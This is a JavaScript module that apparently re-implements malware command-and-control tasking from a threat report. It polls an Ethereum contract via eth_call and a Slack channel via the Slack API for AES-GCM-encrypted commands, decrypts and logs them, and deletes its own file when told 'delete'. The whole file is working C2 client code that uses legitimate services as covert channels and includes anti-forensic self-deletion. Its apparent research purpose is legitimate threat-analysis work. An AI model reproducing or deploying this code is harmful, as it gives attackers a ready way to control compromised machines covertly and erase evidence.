const {webcrypto: crypto} = require('node:crypto');
const {unlinkSync} = require('node:fs');

// Prospective JavaScript port of the reported encrypted tasking behavior.
// AES-GCM framing is synthetic; the report specifies AES, not its mode.
async function poll(rpc, key, token, channel, contract, selector) {
  for (;;) {
    const chainResponse = await fetch(rpc, {
      method: 'POST', headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({jsonrpc: '2.0', id: 1, method: 'eth_call',
        params: [{to: contract, data: selector}, 'latest']})
    });
    const entry = await chainResponse.json();
    const packet = Buffer.from(entry.result, 'base64');
    const source = await crypto.subtle.decrypt({name: 'AES-GCM', iv: packet.subarray(0,12)}, key, packet.subarray(12));
    console.log(new TextDecoder().decode(source));

    const response = await fetch('https://slack.com/api/conversations.history?channel='+channel,
      {headers: {Authorization: 'Bearer '+token}});
    const history = await response.json();
    if (history.messages.length) {
      const body = Buffer.from(history.messages[0].text, 'base64');
      const plain = await crypto.subtle.decrypt({name:'AES-GCM', iv:body.subarray(0,12)}, key, body.subarray(12));
      const code = new TextDecoder().decode(plain);
      if (code === 'delete') { unlinkSync(__filename); return; }
      console.log(code);
    }
    await new Promise(resolve => setTimeout(resolve, 10000));
  }
}
module.exports = poll;
